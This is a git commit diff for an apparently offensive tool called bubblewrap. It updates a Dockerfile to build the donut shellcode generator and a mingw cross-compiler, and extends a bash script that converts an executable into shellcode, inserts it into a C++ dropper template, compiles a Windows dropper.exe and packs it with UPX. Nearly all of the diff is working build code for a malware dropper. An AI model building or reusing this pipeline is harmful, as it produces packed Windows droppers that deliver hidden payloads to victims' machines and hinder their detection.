0b16380a91fac95f8ab840bb05d538118ae78dce
jimmio <git-jimmio.o3lma@dralias.com>
2021-11-28 13:35:34 -0500

    bash script automates the pipeline, need to test the payload

--- Dockerfile
+++ Dockerfile
@@ -3,7 +3,7 @@ FROM debian:11
 WORKDIR /opt
 
 RUN apt update && \
-    apt install -y gcc git make upx && \
+    apt install -y gcc git make mingw-w64 upx && \
     git clone https://github.com/TheWover/donut.git && \
     cd donut && \
     make
--- bubblewrap.sh
+++ bubblewrap.sh
@@ -7,6 +7,23 @@ if [ $# -eq 0 ]; then
     exit 0
 fi
 
+# generate shellcode
 /opt/donut/donut -a 2 -f 3 /root/bubblewrap/$1
-# tail -n +2 loader.rb | head -n -1 | less
-# upx --ultra-brute /root/bubblewrap/$1 -o /root/bubblewrap/packed.exe
+
+# extract the lines containing bytes
+tail -n +2 /root/bubblewrap/loader.rb | head -n -1 > loader-trimmed.rb
+
+# get the position of the byte array in the dropper template
+INSERT_PAYLOAD_AT_LINE=$(grep -n "unsigned char payload" dropper_base.cpp | cut -d \: -f 1)
+
+# get the length of the shellcode (assumes 16 bytes per line)
+let "NUM_BYTES = 16 * $(wc -l loader-trimmed.rb | cut -d ' ' -f 1)"
+
+# insert the shellcode and its length into the dropper template
+sed -e "${INSERT_PAYLOAD_AT_LINE}r loader-trimmed.rb" -e "s/payload_len \= 0/payload_len \= ${NUM_BYTES}/g" /root/bubblewrap/dropper_base.cpp > /root/bubblewrap/dropper_mod.cpp
+
+# compile the dropper
+x86_64-w64-mingw32-c++ -o /root/bubblewrap/dropper.exe -static-libgcc -static-libstdc++ /root/bubblewrap/dropper_mod.cpp
+
+# pack the dropper
+upx --ultra-brute /root/bubblewrap/dropper.exe -o /root/bubblewrap/dropper-packed.exe
